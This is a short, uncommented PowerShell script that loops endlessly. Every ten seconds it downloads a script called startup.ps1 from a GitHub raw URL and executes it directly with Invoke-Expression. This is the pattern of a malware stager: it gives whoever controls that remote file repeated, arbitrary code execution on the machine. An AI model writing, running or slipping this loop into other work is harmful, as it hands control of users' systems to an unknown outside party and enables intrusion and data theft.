while ($true) {
    iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/startup.ps1" -useb)
    Start-Sleep -Seconds 10
}
